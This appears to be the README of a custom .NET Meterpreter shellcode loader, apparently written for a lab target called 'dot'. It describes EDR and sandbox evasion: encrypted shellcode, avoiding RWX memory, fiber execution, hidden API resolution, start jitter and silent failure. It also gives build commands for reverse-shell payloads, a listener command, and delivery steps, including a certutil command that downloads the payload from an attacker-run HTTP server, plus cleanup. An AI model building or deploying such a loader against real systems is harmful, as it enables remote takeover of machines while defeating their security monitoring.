# Custom .NET Meterpreter Loader — Shadow Supply / dot

A hand-rolled shellcode loader that intentionally avoids the msfvenom-generated
executable formats and their well-known signatures. The Meterpreter shellcode
itself still comes from msfvenom (that's what your multi/handler expects), but
the wrapper around it is fresh code — different from every prior artifact
you've dropped in the lab.

## What makes it different from a stock msfvenom EXE

- **AES-256-CBC encrypted shellcode** embedded as Base64. Fresh key + IV every build.
- **No RWX allocation** — allocate RW, copy, flip to RX. RWX regions are a common EDR flag.
- **Fiber-based execution** via `ConvertThreadToFiber` + `CreateFiber` + `SwitchToFiber`.
  No `CreateThread`, no `CreateRemoteThread`, no `EnumSystemLocales` callback trick
  (that one is burned).
- **Runtime API resolution** — the suspicious kernel32 APIs are pulled with
  `GetProcAddress` and invoked via delegates, so a static P/Invoke table
  scan doesn't see `VirtualAlloc`/`VirtualProtect` bound at compile time.
- **Random start jitter** (2.5–6.5 s) to burn short-run sandbox windows.
- **Managed plaintext wipe** — the decrypted shellcode is zeroed on the
  managed heap right after copying to native memory.
- **Silent fail** — any exception path is swallowed; no console output.

## Build (on Kali)

```
chmod +x build.sh
./build.sh <LHOST> <LPORT>                           # defaults: svcupd.exe, reverse_https
./build.sh 10.10.14.5 443 update.exe                 # rename output
./build.sh 10.10.14.5 8443 update.exe windows/x64/meterpreter/reverse_tcp
```

Requires: `msfvenom`, `mono-mcs` (`apt install mono-mcs`), `openssl`, `python3`.

Output: `svcupd.exe` (or the name you passed), 64-bit .NET Framework 4.x EXE.

## Listener

```
msfconsole -q -r handler.rc
```

Edit `handler.rc` to match the LHOST / LPORT / PAYLOAD you built.
`reverse_https` on 443/8443 typically survives egress filtering better than `reverse_tcp`.

## Delivery to dot (pick what fits your foothold)

- **SMB write** to a share you can reach, then execute via WMI/scheduled task.
- **HTTP hosted** on your Kali `python3 -m http.server 8080` and pulled with
  `certutil -urlcache -f http://LHOST:8080/svcupd.exe C:\Windows\Tmp\svcupd.exe`.
- **Living-off-the-land pull** with `curl.exe` (present on modern Windows).
- Execute directly — no need for `powershell.exe`; the loader is a real EXE.

## Notes on target compatibility

- Requires **.NET Framework 4.0+** on target. Every current Windows Server /
  Windows 10+ ships with a compatible runtime. If dot is unusually stripped
  (Server Core minimal), verify: `powershell -c "[System.Environment]::Version"`.
- Built as x64. If dot is x86, swap the msfvenom payload to
  `windows/meterpreter/reverse_https` and rebuild with `mcs /platform:x86`.
- Rebuild for every drop — the AES key changes, so the file hash changes.

## Cleanup

- `del C:\path\to\svcupd.exe` after your session migrates elsewhere.
- Kill your listener when done: `jobs -K` in msfconsole.
